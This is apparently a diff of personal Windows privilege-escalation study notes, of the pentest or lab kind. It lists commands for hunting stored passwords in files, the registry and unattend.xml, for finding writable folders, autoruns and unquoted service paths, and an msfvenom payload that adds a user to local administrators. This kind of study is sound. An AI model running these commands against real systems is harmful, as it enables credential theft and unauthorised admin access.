@@ -1,6 +1,81 @@
 <h1>Windows Priv esc learning</h1>
 
+<h2>pre requists </h2>
+
+If on a box check perms and check other users
+whoami /priv
+whoami /groups
+net user
+whoami /all
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+
+List shares
+net share
+powershell Find-DomainShare -ComputerDomain domain.local
+
+Find passwords
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config
+findstr /spin "password" *.*
+
+Find certain files
+dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+where /R C:\ user.txt
+where /R C:\ *.ini
+
+
+Search the registry for key names and passwords
+REG QUERY HKLM /F "password" /t REG_SZ /S /K
+REG QUERY HKCU /F "password" /t REG_SZ /S /K
+
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
+reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
+
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+Passwords in unattend.xml
+Location of the unattend.xml files.
+
+C:\unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+<h2> default writeable shares </h2>
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\spool\printers
+C:\Windows\System32\spool\servers
+C:\Windows\tracing
+C:\Windows\Temp
+C:\Users\Public
+C:\Windows\Tasks
+C:\Windows\System32\tasks
+C:\Windows\SysWOW64\tasks
+C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
+C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
+C:\Windows\debug\wia
+C:\Windows\registration\crmlog
+C:\Windows\System32\com\dmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\System32\fxstmp
+C:\Windows\SysWOW64\fxstmp
+
 <h2>Autoruns</h2>
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+
 can get a tool called autoruns - will show programs that automatically run which if writeable can create reverse shell
 from msfconsole and replace program
 
@@ -14,6 +89,8 @@ msiexec /quiet /qn /i /pathtosoftwarecreated
 
 <h2>unquoted service paths</h2>
 Run winpeas and check for any unquoted service paths
+if winpeas wont work try run
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 for example if path -- C:\Program Files\unquoted path\Common Files
 create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
 place in C:\Program Files\unquoted path (this ovbiously changes path for what you found)
@@ -36,6 +113,7 @@ run
 
 <h2> Scheduled Tasks</h2>
 View tasks --- schtasks /query /fo LIST /v 
+tasklist /v /fi "username eq system"
 
 AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify the script
 download here ---- https://github.com/ankh2054/windows-pentest
